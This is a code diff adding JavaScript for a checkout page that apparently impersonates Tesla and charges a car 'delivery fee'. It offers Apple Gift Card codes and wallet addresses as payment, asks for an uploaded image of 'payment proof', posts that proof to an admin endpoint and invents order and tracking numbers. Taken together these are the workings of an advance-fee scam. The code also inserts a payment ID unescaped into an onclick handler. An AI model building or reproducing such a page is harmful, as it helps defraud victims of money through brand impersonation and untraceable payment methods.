+        { id:'applegift', name:'applegift', display_name:'Apple Gift Card', type:'gift', icon_emoji:'🍎', enabled:true, sort_order:7, wallet_address:'', payment_instructions:'Send Apple Gift Card code. Include the code in your upload notes.' }
+      ];
+      localStorage.setItem('tesla_payment_methods', JSON.stringify(paymentMethods));
+    }
+    renderPaymentMethods();
+    renderOrderSummary();
+  }
+
+  function renderPaymentMethods() {
+    var list = document.getElementById('paymentMethodsList');
+    if (!list) return;
+    var enabled = paymentMethods.filter(function(pm) { return pm.enabled !== false; });
+    list.innerHTML = enabled.map(function(pm) {
+      var icon = pm.icon_emoji || pm.icon || '💳';
+      var name = pm.display_name || pm.displayName || pm.name || 'Payment';
+      var isSelected = selectedPaymentId === pm.id;
+      return '<div class="other-method-card' + (isSelected ? ' selected' : '') + '" onclick="window.selectPaymentMethod(\'' + pm.id + '\')">' +
+        '<div class="om-icon">' + icon + '</div>' +
+        '<div class="om-name">' + escapeHtml(name) + '</div>' +
+        (isSelected ? '<div class="om-badge selected-badge" style="background:#E31937;color:#fff;display:inline-block;font-size:9px;font-weight:700;padding:2px 6px;border-radius:999px;margin-top:4px;">Selected</div>' : '') +
+        '</div>';
+    }).join('');
+  }
+
+  function selectPaymentMethod(id) {
+    selectedPaymentId = id;
+    renderPaymentMethods();
+    showPaymentDetails(id);
+    var submitBtn = document.getElementById('submitBtn');
+    if (submitBtn && uploadedFileData) {
+      submitBtn.disabled = false;
+      submitBtn.style.opacity = '1';
+      submitBtn.style.cursor = 'pointer';
+    }
+  }
+
+  function showPaymentDetails(id) {
+    var pm = paymentMethods.find(function(p) { return p.id === id; });
+    if (!pm) return;
+
+    var section = document.getElementById('paymentDetailSection');
+    section.style.display = 'block';
+    section.style.animation = 'slideInUp 0.3s ease';
+
+    var name = pm.display_name || pm.displayName || pm.name || 'Payment';
+    var icon = pm.icon_emoji || pm.icon || '💳';
+    var type = pm.type || 'wallet';
+    var address = pm.wallet_address || pm.walletAddress || '';
+    var instructions = pm.payment_instructions || pm.instructions || '';
+
+    document.getElementById('pmDetailTitle').textContent = name;
+    document.getElementById('pmDetailType').textContent = type.charAt(0).toUpperCase() + type.slice(1);
+
+    var iconEl = document.getElementById('pmBigIcon');
+    iconEl.textContent = icon;
+    iconEl.className = 'pay-big-icon ' + type;
+
+    var addrBox = document.getElementById('walletAddressBox');
+    var addrEl = document.getElementById('walletAddress');
+    if (address) {
+      addrBox.style.display = 'block';
+      addrEl.textContent = address;
+    } else {
+      addrBox.style.display = 'none';
+    }
+
+    var qrContainer = document.getElementById('qrContainer');
+    var qrPlaceholder = document.getElementById('qrPlaceholder');
+    var qrEmoji = document.getElementById('qrEmoji');
+    if (address && type !== 'card' && type !== 'gift') {
+      qrContainer.style.display = 'block';
+      qrPlaceholder.innerHTML = '<span style="font-size:32px;color:#ccc;">' + icon + '</span>';
+    } else {
+      qrContainer.style.display = 'none';
+    }
+
+    var instrEl = document.getElementById('paymentInstructions');
+    instrEl.textContent = instructions || 'Send the exact delivery fee amount. Include your Order ID in the payment reference.';
+
+    // Scroll to detail section
+    section.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  }
+
+  function copyAddress() {
+    var addr = document.getElementById('walletAddress').textContent;
+    if (!addr || addr === '—') return;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(addr).then(function() {
+        var btn = document.getElementById('copyAddressBtn');
+        btn.textContent = '✓ Copied!';
+        btn.classList.add('copied');
+        setTimeout(function() { btn.textContent = '📋 Copy'; btn.classList.remove('copied'); }, 2000);
+      }).catch(function() { fallbackCopy(addr); });
+    } else {
+      fallbackCopy(addr);
+    }
+  }
+
+  function fallbackCopy(text) {
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); showToast('Address copied!'); } catch(e) { showToast('Could not copy', 'error'); }
+    document.body.removeChild(ta);
+  }
+
+  function renderOrderSummary() {
+    var fee = deliveryMethod.priceDisplay || '$' + (deliveryMethod.price || '299');
+    document.getElementById('smModel').textContent = 'Tesla ' + (selectedCar.name || '');
+    document.getElementById('smMethod').textContent = deliveryMethod.name || 'Standard Delivery';
+    document.getElementById('smTime').textContent = deliveryMethod.days || '5–10 business days';
+    document.getElementById('smName').textContent = deliveryDetails.fullName || '—';
+    document.getElementById('smAddr').textContent = [deliveryDetails.address, deliveryDetails.city, deliveryDetails.state, deliveryDetails.zipCode].filter(Boolean).join(', ') || '—';
+    document.getElementById('smPhone').textContent = deliveryDetails.phone || '—';
+    document.getElementById('smTotal').textContent = fee;
+  }
+
+  // ── FILE UPLOAD ──
+  function handleFileSelect(input) {
+    var file = input.files && input.files[0];
+    if (!file) return;
+    processFile(file);
+    // Reset input so same file can be re-selected
+    input.value = '';
+  }
+
+  function processFile(file) {
+    if (!file.type.startsWith('image/')) {
+      showToast('Please select an image file (JPEG, PNG, etc.)', 'error');
+      return;
+    }
+    if (file.size > 10 * 1024 * 1024) {
+      showToast('File is too large. Maximum size is 10MB.', 'error');
+      return;
+    }
+
+    uploadedFileName = file.name;
+    var reader = new FileReader();
+    reader.onload = function(e) {
+      uploadedFileData = e.target.result;
+      showPreview(uploadedFileData, file.name, file.size);
+    };
+    reader.readAsDataURL(file);
+  }
+
+  function showPreview(dataUrl, name, size) {
+    var uploadState = document.getElementById('uploadState');
+    var preview = document.getElementById('uploadPreview');
+    uploadState.style.display = 'none';
+    preview.classList.add('show');
+    preview.style.display = 'block';
+
+    document.getElementById('previewImage').src = dataUrl;
+    document.getElementById('previewFileName').textContent = name || 'Receipt';
+    document.getElementById('previewFileSize').textContent = size ? formatSize(size) : '';
+
+    // Enable submit button if payment method is selected
+    var submitBtn = document.getElementById('submitBtn');
+    if (submitBtn && selectedPaymentId) {
+      submitBtn.disabled = false;
+      submitBtn.style.opacity = '1';
+      submitBtn.style.cursor = 'pointer';
+    }
+  }
+
+  function resetUpload() {
+    uploadedFileData = null;
+    uploadedFileName = '';
+    var uploadState = document.getElementById('uploadState');
+    var preview = document.getElementById('uploadPreview');
+    uploadState.style.display = 'block';
+    preview.classList.remove('show');
+    preview.style.display = 'none';
+
+    var submitBtn = document.getElementById('submitBtn');
+    submitBtn.disabled = true;
+    submitBtn.style.opacity = '.5';
+    submitBtn.style.cursor = 'not-allowed';
+  }
+
+  function openCamera() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      // Fallback to file picker with camera
+      var cameraInput = document.getElementById('cameraInput');
+      if (cameraInput) cameraInput.click();
+      return;
+    }
+    // Try using the capture attribute approach
+    var cameraInput = document.getElementById('cameraInput');
+    if (cameraInput) cameraInput.click();
+  }
+
+  function formatSize(bytes) {
+    if (bytes < 1024) return bytes + ' B';
+    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+    return (bytes / 1048576).toFixed(1) + ' MB';
+  }
+
+  function confirmUpload() {
+    if (!uploadedFileData) { showToast('No file selected', 'error'); return; }
+    showUploadStatus('✅ Payment proof uploaded successfully!', 'success');
+    showToast('Proof uploaded — you can now complete your order');
+    var submitBtn = document.getElementById('submitBtn');
+    if (submitBtn && selectedPaymentId) {
+      submitBtn.disabled = false;
+      submitBtn.style.opacity = '1';
+      submitBtn.style.cursor = 'pointer';
+    }
+  }
+
+  function showUploadStatus(msg, type) {
+    var status = document.getElementById('uploadStatus');
+    status.style.display = 'block';
+    status.textContent = msg;
+    status.style.background = type === 'success' ? 'rgba(0,165,80,.08)' : 'rgba(239,68,68,.08)';
+    status.style.color = type === 'success' ? 'var(--success)' : 'var(--danger)';
+    status.style.border = '1px solid ' + (type === 'success' ? 'rgba(0,165,80,.2)' : 'rgba(239,68,68,.2)');
+  }
+
+  // ── SUBMIT ──
+  function submitPayment() {
+    if (!selectedPaymentId) { showToast('Please select a payment method', 'error'); return; }
+    if (!uploadedFileData) { showToast('Please upload your payment proof first', 'error'); return; }
+
+    var pm = paymentMethods.find(function(p) { return p.id === selectedPaymentId; });
+    var pmName = pm ? (pm.display_name || pm.displayName || pm.name || selectedPaymentId) : selectedPaymentId;
+
+    // Save payment proof to localStorage
+    var proofs = [];
+    try { proofs = JSON.parse(localStorage.getItem('tesla_payment_proofs') || '[]'); } catch(e) {}
+    var proof = {
+      id: 'proof_' + Date.now(),
+      user_id: 'customer',
+      order_id: 'TSLA-' + Date.now().toString(36).toUpperCase(),
+      payment_method: pmName,
+      proof_url: uploadedFileData,
+      proof_type: 'image',
+      amount: deliveryMethod.priceDisplay || '$' + (deliveryMethod.price || '299'),
+      status: 'pending',
+      created_at: new Date().toISOString()
+    };
+    proofs.unshift(proof);
+    localStorage.setItem('tesla_payment_proofs', JSON.stringify(proofs));
+
+    // Save as last order
+    var orderData = {
+      orderId: proof.order_id,
+      trackingNumber: 'TRK-' + Math.random().toString(36).substring(2, 10).toUpperCase(),
+      email: deliveryDetails.email || '',
+      entryId: 'entry_' + Date.now(),
+      selectedCar: selectedCar,
+      deliveryDetails: deliveryDetails,
+      deliveryMethod: deliveryMethod,
+      paymentMethod: { id: selectedPaymentId, name: pmName },
+      status: 'awaiting_payment_confirmation',
+      orderDate: new Date().toISOString(),
+      estimatedDelivery: deliveryMethod.days || '5–10 business days'
+    };
+    localStorage.setItem('tesla_last_order', JSON.stringify(orderData));
+
+    // Try API call if available
+    var API_BASE = (typeof window.TESLA_API_BASE !== 'undefined' && window.TESLA_API_BASE)
+      ? window.TESLA_API_BASE.replace(/\/+$/, '') : '';
+
+    if (API_BASE) {
+      // Submit to API (best effort)
+      var controller = new AbortController();
+      var timeout = setTimeout(function() { controller.abort(); }, 10000);
+      fetch(API_BASE + '/order', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          sessionToken: sessionToken,
+          selectedCar: selectedCar,
+          deliveryDetails: deliveryDetails,
+          deliveryMethod: deliveryMethod,
+          paymentMethod: { id: selectedPaymentId, name: pmName }
+        })
+      }).then(function(r) { return r.json(); }).then(function(r) {
+        if (r.order) {
+          localStorage.setItem('tesla_last_order', JSON.stringify(r.order));
+        }
+      }).catch(function() {}).finally(function() { clearTimeout(timeout); });
+
+      // Also submit payment proof
+      fetch(API_BASE + '/admin/payment-proofs/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(proof)
+      }).catch(function() {});
+    }
+
+    // Redirect to order confirmation
+    window.location.href = 'order-placed.html';
+  }
+
+  // ── HELPERS ──
+  function escapeHtml(str) {
+    if (str == null) return '';
+    var d = document.createElement('div');
+    d.textContent = String(str);
+    return d.innerHTML;
+  }
+
+  function showToast(msg, type) {
+    type = type || 'success';
+    if (typeof window.showToast === 'function') {
+      window.showToast(msg, type);
+      return;
+    }
+    var existing = document.querySelectorAll('.toast-notif');
+    for (var i = 0; i < existing.length; i++) existing[i].remove();
+    var t = document.createElement('div');
+    t.className = 'toast-notif toast-' + type;
+    var icons = { success: '✓', error: '✕', info: 'ℹ', warning: '⚠' };
+    t.innerHTML = '<span class="toast-icon">' + (icons[type] || '✓') + '</span><span class="toast-msg">' + msg + '</span>';
+    t.style.cssText = 'position:fixed;bottom:24px;right:24px;z-index:99999;display:flex;align-items:center;gap:12px;padding:14px 22px;border-radius:12px;font-size:14px;font-weight:500;max-width:380px;box-shadow:0 12px 40px rgba(0,0,0,.2);animation:slideInRight .35s ease;color:white;background:' + (type === 'error' ? '#EF4444' : type === 'warning' ? '#F59E0B' : '#171A20') + ';';
+    document.body.appendChild(t);
+    setTimeout(function() { t.style.opacity = '0'; t.style.transform = 'translateX(20px)'; t.style.transition = 'opacity .35s ease, transform .35s ease'; setTimeout(function() { if (t.parentNode) t.remove(); }, 350); }, 5000);
+  }
+
+  // ── INIT ──
+  window.selectPaymentMethod = selectPaymentMethod;
+  window.copyAddress = copyAddress;
+  window.handleFileSelect = handleFileSelect;
+  window.openCamera = openCamera;
+  window.resetUpload = resetUpload;
+  window.confirmUpload = confirmUpload;
+  window.submitPayment = submitPayment;
+
+  loadPaymentMethods();
+
+  // Auto-select first enabled payment method
+  var enabled = paymentMethods.filter(function(pm) { return pm.enabled !== false; });
+  if (enabled.length > 0 && !selectedPaymentId) {
+    selectPaymentMethod(enabled[0].id);
+  }
+
+})();
 </script>
 </body>
 </html>
